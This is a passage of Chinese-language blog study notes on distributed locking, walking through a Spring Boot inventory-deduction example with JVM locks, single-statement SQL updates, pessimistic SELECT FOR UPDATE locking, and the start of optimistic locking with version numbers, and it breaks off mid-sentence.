    <content type="html"><![CDATA[<h1 id="分布式锁学习笔记"><a href="#分布式锁学习笔记" class="headerlink" title="分布式锁学习笔记"></a>分布式锁学习笔记</h1><p>分布式锁学习笔记持续更新中，预计10月下旬更完~ </p><p>该笔记中除了视频中核心的笔记、代码，还额外补充了视频中老师讲解过的但官方笔记中没有提到的重要内容。 </p><p>有错误或者遗漏的地方请大家提出来呀，有不懂的地方留言我尽量回答（毕竟我也很菜~</p><p>2022.10.14:更换图床解决了图片加载问题</p><p>2022.10.16:基于Redis的分布式锁笔记已更完…（p51之前）</p><p>2022.10.17:zookeeper基础已更完…（p62之前）</p><p>2022.10.21:完结撒花~，笔记全部做完啦（Curator底层原理加锁部分待完善…</p><h2 id="1-传统锁-减库存案例"><a href="#1-传统锁-减库存案例" class="headerlink" title="1. 传统锁 - 减库存案例"></a>1. 传统锁 - 减库存案例</h2><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/stock.png"></p><p>多线程同时操纵同一个服务的共享资源，必然会造成线程安全问题。</p><p>解决方案：采用JVM提供的 <code>Reentrantlock</code> 或者 <code>Synchronized</code> 锁</p><h3 id="1-1-初始化工程"><a href="#1-1-初始化工程" class="headerlink" title="1.1 初始化工程"></a>1.1 初始化工程</h3><p>这一部分跟着视频完成，以下内容省略了未连接数据库之前的部分（个人认为之前未连接数据库的部分仅演示了并发流程，与实际业务关联性不大，也较为容易，可自行实现）。</p><ol><li><p>创建SpringBoot工程，选择 <code>JDK8</code> 版本，引入 <code>Spring Web</code></p></li><li><p>在 <code>pom.xml</code>引入如下依赖</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>创建数据库 <code>distributed_lock</code>，在数据库内创建表 <code>db_stock</code>，创建如下字段。</p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/20221008221626.png"></p><p> 新建一条数据记录</p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/20221008221728.png"></p></li><li><p>修改application.properties文件，规定Web启动端口号</p> <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">10010</span><br><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">com.mysql.jdbc.Driver</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql://127.0.0.1:3306/distributed_lock</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">root</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string">your password</span><br></code></pre></td></tr></table></figure></li><li><p>在目录下创建 <code>pojo</code> 包，用于存放实体类 <code>Stock</code> 对象</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@TableName(&quot;db_stock&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> &#123;<br><br><span class="hljs-keyword">private</span> Long id;<br><span class="hljs-keyword">private</span> String productCode;<br><span class="hljs-keyword">private</span> String warehouse;<br><span class="hljs-keyword">private</span> Integer count;<br>&#125;<br></code></pre></td></tr></table></figure><p> 创建 <code>mapper</code> 包，创建 <code>StockMapper</code> 类</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;Stock&gt; &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 更改 <code>SpringBoot</code> 启动类，添加如下注解</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.ltyzzz.distributedlock.mapper&quot;)</span><br></code></pre></td></tr></table></figure><p> 创建 <code>service</code> 包，创建 <code>StockService</code> 类</p><p> try-finally块之后用于加锁</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StockService</span> &#123;<br><br><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> StockMapper stockMapper;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.stockMapper.selectOne(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;product_code&quot;</span>, <span class="hljs-string">&quot;1001&quot;</span>));<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>            stock.setCount(stock.getCount() - <span class="hljs-number">1</span>);<br>            <span class="hljs-built_in">this</span>.stockMapper.updateById(stock);<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 创建 <code>controller</code> 包，创建 <code>StockController</code> 类</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StockController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    StockService stockService;<br><br>    <span class="hljs-meta">@GetMapping(&quot;stock/deduct&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>        stockService.deduct();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello stock deduct!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-2-JVM本地锁"><a href="#1-2-JVM本地锁" class="headerlink" title="1.2 JVM本地锁"></a>1.2 JVM本地锁</h3><h4 id="1-2-1-使用JMeter进行并发测试"><a href="#1-2-1-使用JMeter进行并发测试" class="headerlink" title="1.2.1 使用JMeter进行并发测试"></a>1.2.1 使用JMeter进行并发测试</h4><p>首先启动 SpringBoot 库存项目</p><p>利用 <code>JMeter</code> 进行压力测试</p><ol><li><p>创建 <code>Thread Group</code></p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/thread-group.png"></p></li><li><p>设置 <code>Thread Properties</code></p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/thread-proper.png"></p></li><li><p>设置 <code>request</code> </p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/reque.png"></p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/20221008224501.png"></p></li><li><p>添加 <code>Aggregate Report</code></p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/20221008224122.png"></p></li><li><p>运行压力测试，正常执行情况最终库存应该为0</p></li></ol><p>最终数据库结果如下</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/data%20stcok.png"></p><p>此时产生了并发操作</p><p>有两种极限情况</p><ul><li><p>所有并发请求都完美的交错执行，正确地完成了数据库更新，最终库存为0</p></li><li><p>所有并发请求同一时间并发，同时执行了数据库更新操作，并发线程数为100，循环次数为50，最终库存为4950</p></li></ul><h4 id="1-2-2-加入JVM本地锁解决并发问题"><a href="#1-2-2-加入JVM本地锁解决并发问题" class="headerlink" title="1.2.2 加入JVM本地锁解决并发问题"></a>1.2.2 加入JVM本地锁解决并发问题</h4><p>修改 <code>StockService</code>。使用 <code>ReentrantLock</code> 或 <code>Synchronized</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StockService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StockMapper stockMapper;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>        lock.lock();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.stockMapper.selectOne(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;product_code&quot;</span>, <span class="hljs-string">&quot;1001&quot;</span>));<br>            <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>                stock.setCount(stock.getCount() - <span class="hljs-number">1</span>);<br>                <span class="hljs-built_in">this</span>.stockMapper.updateById(stock);<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            lock.unlock();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动 <code>SpringBoot</code> 工程，继续进行压力测试，最终库存为0。</p><h4 id="1-2-3-JVM本地锁失效的情况"><a href="#1-2-3-JVM本地锁失效的情况" class="headerlink" title="1.2.3 JVM本地锁失效的情况"></a>1.2.3 JVM本地锁失效的情况</h4><p>共有三种情况</p><h5 id="多例模式"><a href="#多例模式" class="headerlink" title="多例模式"></a>多例模式</h5><p>修改 <code>StockService</code>，设置多例模式</p><p>添加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Scope(value = &quot;prototype&quot;, proxyMode = ScopedProxyMode.TARGET_CLASS)</span><br></code></pre></td></tr></table></figure><p>JDK动态代理使用 <code>INTERFACES</code>，CGLIB代理使用 <code>TARGET_CLASS</code></p><p>默认情况下使用JDK动态代理，原生Spring默认是JDK动态代理</p><p>而SpringBoot在2.0版本之后默认使用CGLIB代理</p><p>启动 <code>SpringBoot</code> 工程，继续进行压力测试，最终库存不为0，说明本地锁失效</p><h5 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h5><p>在 <code>service</code> 方法上添加事务注解 <code>@Transactional</code></p><p>启动 <code>SpringBoot</code> 工程，继续进行压力测试，最终库存不为0，说明本地锁失效</p><p>事务采用AOP思想实现：</p><ol><li><p>在AOP的前置方法内开启事务</p></li><li><p>进入service方法，获取锁</p></li><li><p>进行查询库存、更新库存操作</p></li><li><p>释放锁</p></li><li><p>在AOP的后置方法内提交或回滚事务</p></li></ol><p>在并发情况下，如图所示</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/tab.png" title="" alt="" width="236"><p>b用户在a用户还未提交事务之前，就获取到了a用户释放的锁，读取到了库存，但该库存为旧的库存（因为a用户还未提交事务），所以b用户是在旧库存的基础上进行修改，因此产生了并发问题。</p><p>解决方案：设置事务隔离级别</p><p>将注解改为：<code>@Transactional(isolation = Isolation.READ_UNCOMMITTED)</code></p><p>即此时b用户可以读取到a用户未提交的数据，即该数据为最新数据，可以解决此问题。</p><p>但实际业务中不能这样去使用，采用事务就是为了保证原子性，要么全部成功，要么全部失败。假设b用户在这种方式下读取到了最新数据，虽然可以解决超卖问题，但是如果a回滚了事务，那么b用户读取到的数据就是错误的，又会产生新的混乱。</p><h5 id="集群部署"><a href="#集群部署" class="headerlink" title="集群部署"></a>集群部署</h5><p>多个服务器部署</p><p>去掉 <code>@Transactional</code> 注解，保证在单机模式下锁生效，无并发问题。</p><p>这部分看视频做</p><ol><li><p>设置两个SpringBoot启动类，设置不同的端口号，并启动</p></li><li><p>更改 <code>nginx</code> 配置文件</p> <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> distributedLock &#123;<br>    <span class="hljs-attribute">server</span> localhost:<span class="hljs-number">10086</span>;<br>    <span class="hljs-attribute">server</span> localhost:<span class="hljs-number">10010</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://distributedLock;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>启动nginx</p></li></ol><p>任务管理器中出现两个nginx即代表启动成功，一个工作进程，一个主进程</p><p>以默认端口80进行访问：<code>localhost:80/stock/deduct</code></p><p>之后，使用JMeter进行压力测试，5000个请求成功发出，但最终库存不为0，锁失效。</p><h3 id="1-3-单SQL语句解决并发问题"><a href="#1-3-单SQL语句解决并发问题" class="headerlink" title="1.3 单SQL语句解决并发问题"></a>1.3 单SQL语句解决并发问题</h3><h4 id="1-3-1-实现过程"><a href="#1-3-1-实现过程" class="headerlink" title="1.3.1 实现过程"></a>1.3.1 实现过程</h4><p>原 <code>Service</code> 代码流程</p><ol><li><p>查询库存</p></li><li><p>判断库存是否充足</p></li><li><p>更新库存到数据库</p></li></ol><p>该流程可以使用一个SQL语句实现</p><p>为 <code>StockMapper</code> 添加方法 updateStock，</p><p>参数为商品编号 <code>productCode</code> 与减库存数量<code>count</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;Stock&gt; &#123;<br>    <span class="hljs-meta">@Update(&quot;update db_stock set count = count - #&#123;count&#125; where product_code = #&#123;productCode&#125; and count &gt;= #&#123;count&#125;&quot;)</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">updateStock</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;productCode&quot;)</span> String productCode, <span class="hljs-meta">@Param(&quot;count&quot;)</span> Integer count)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>SQL语句如下：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> db_stock <span class="hljs-keyword">set</span> <span class="hljs-built_in">count</span> = <span class="hljs-built_in">count</span> - #&#123;<span class="hljs-built_in">count</span>&#125; <span class="hljs-keyword">where</span> product_code = #&#123;productCode&#125; <span class="hljs-keyword">and</span> <span class="hljs-built_in">count</span> &gt;= #&#123;<span class="hljs-built_in">count</span>&#125;<br></code></pre></td></tr></table></figure><p>在MySQL中，更新、新增、删除写操作，会加悲观锁，具有原子性，可以解决并发问题。</p><p>在 <code>StockService</code> 中调用该Mapper方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockMapper.updateStock(<span class="hljs-string">&quot;1001&quot;</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在集群部署情况下，使用JMeter进行压力测试，5000个请求成功发出，最终库存为0。</p><h4 id="1-3-2-优缺点"><a href="#1-3-2-优缺点" class="headerlink" title="1.3.2 优缺点"></a>1.3.2 优缺点</h4><p>优点：</p><ol><li>可以解决多例模式、事务、集群部署下的并发问题</li></ol><p>缺点：</p><ol><li><p>锁范围问题</p></li><li><p>同一个商品有多条库存记录（多仓库）</p><ul><li><p>如果仍然使用该方法，则会对所有仓库库存数进行自减</p></li><li><p>正常情况应灵活从各个仓库进行减库存发货</p></li></ul></li><li><p>无法记录库存变化前后的状态</p><ul><li>原因：单条SQL语句</li></ul></li></ol><h5 id="锁范围问题"><a href="#锁范围问题" class="headerlink" title="锁范围问题"></a>锁范围问题</h5><p>表级锁 VS 行级锁</p><ul><li><p>未添加索引之前为 <code>表级锁</code></p><ul><li><p>在用户a中，先开启事务，再去更新 <code>productCode = 1001</code> 记录，但不提交事务</p></li><li><p>这导致：在用户b中，更新 <code>productCode = 1002</code> 记录，但进入了阻塞</p></li><li><p>用户a提交了事务之后，用户b才能提交成功，证明为表级锁</p></li></ul></li><li><p>添加索引之后为 <code>行级锁</code></p><ol><li><p>锁的查询或更新条件必须为索引字段</p><p> e.g.：根据 <code>productCode</code> 进行查询或更新，为其添加索引</p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/iShot2022-10-08%2023.44.31.png"></p></li><li><p>再次进行之前的操作，用户b不会进入阻塞，即变为了行级锁</p></li><li><p>使用行级锁的条件：</p><p> . 查询或者更新条件必须为索引字段</p><p> . 查询或者更新条件必须为具体值</p><p>   . SQL语句中where条件有索引时，不能为 <code>&#39;like&#39;</code> 或者 <code>&#39;!=&#39;</code>，否则为表级锁</p></li></ol></li></ul><h3 id="1-4-悲观锁"><a href="#1-4-悲观锁" class="headerlink" title="1.4 悲观锁"></a>1.4 悲观锁</h3><p>select … for update</p><h4 id="1-4-1-情景引入"><a href="#1-4-1-情景引入" class="headerlink" title="1.4.1 情景引入"></a>1.4.1 情景引入</h4><p>用户a与b并发执行</p><ol><li><p>用户a开启事务，并使用如下SQL语句查询库存</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> db_stock <span class="hljs-keyword">where</span> product_code<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1001&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>用户b使用如下SQL语句</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> db_stock <span class="hljs-keyword">set</span> count <span class="hljs-operator">=</span> count <span class="hljs-operator">-</span> <span class="hljs-number">1</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></li></ol><p>这时库存已经发生变化，而用户a不知情，仍会已它查出来的库存数作为标准进行下一步操作</p><p>解决方案：用户a采用如下SQL语句，进行加锁操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> db_stock <span class="hljs-keyword">where</span> product_code<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1001&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">update</span>;<br></code></pre></td></tr></table></figure><p>加锁范围：此时满足行级锁条件，因此该悲观锁为行级锁，只锁对应的记录</p><h4 id="1-4-2-代码实现"><a href="#1-4-2-代码实现" class="headerlink" title="1.4.2 代码实现"></a>1.4.2 代码实现</h4><ol><li><p>在StockMapper中添加查询库存方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from db_stock where product_code=#&#123;productCode&#125; for update&quot;)</span><br>List&lt;Stock&gt; <span class="hljs-title function_">queryStock</span><span class="hljs-params">(String productCode)</span>;<br></code></pre></td></tr></table></figure></li><li><p>更新StockService方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 查询库存信息并锁定</span><br>    List&lt;Stock&gt; stocks = <span class="hljs-built_in">this</span>.stockMapper.queryStock(<span class="hljs-string">&quot;1001&quot;</span>);<br>    <span class="hljs-comment">// 取第一个库存</span><br>    <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> stocks.get(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 扣减库存</span><br>        stock.setCount(stock.getCount() - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">this</span>.stockMapper.updateById(stock);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用压力测试工具进行测试，库存数量减为0，解决了并发问题</p></li></ol><h4 id="1-4-3-优缺点"><a href="#1-4-3-优缺点" class="headerlink" title="1.4.3 优缺点"></a>1.4.3 优缺点</h4><p>优点：更加灵活</p><ol><li><p>解决同一个商品有多条库存记录的问题</p><p> 可以先根据商品编号查询库存记录，查询到之后再根据现有技术分析。</p></li><li><p>解决无法记录库存变化前后状态的问题</p></li></ol><p>缺点：</p><ol><li><p>性能问题：效率比JVM本地锁稍高一些，但比单SQL语句低</p></li><li><p>死锁问题：对多条数据加锁时，加锁顺序必须一致</p><p> e.g.：用户a与b执行如下顺序操作</p><ol><li><p>用户a对 <code>id=1</code> 商品加锁 </p></li><li><p>用户b对 <code>id=2</code> 商品加锁</p></li><li><p>用户a想对 <code>id=2</code> 商品加锁，但陷入阻塞</p></li><li><p>用户b想对 <code>id=1</code> 商品加锁，报错 Deadlock</p></li></ol></li><li><p>库存操作需要统一</p></li></ol><h3 id="1-5-乐观锁"><a href="#1-5-乐观锁" class="headerlink" title="1.5 乐观锁"></a>1.5 乐观锁</h3><p>借助时间戳、version版本号实现，利用 <code>CAS</code> 机制</p><p>CAS：Compare and Swap 比较并交换</p><p>关于CAS，可以看看这篇博客：<a href="https://www.cnblogs.com/myopensource/p/8177074.html">漫画：什么是CAS机制</a></p><ul><li><p>如果变量 <code>X</code> 等于旧值 <code>A</code>，则更新将 <code>X</code> 更新为 <code>B</code> </p></li><li><p>若不等于，则放弃更新</p></li></ul><h4 id="1-5-1-实现思路"><a href="#1-5-1-实现思路" class="headerlink" title="1.5.1 实现思路"></a>1.5.1 实现思路</h4><ol><li><p>在 <code>db_stock</code> 表中添加 <code>version</code> 字段</p><p> 类型为int，长度11，Not Null</p></li><li><p>查询对应的商品库存以及 <code>version</code> 号</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> db_stock <span class="hljs-keyword">where</span> product_code<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1001&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>执行更新库存操作时，where条件中需要确认当前 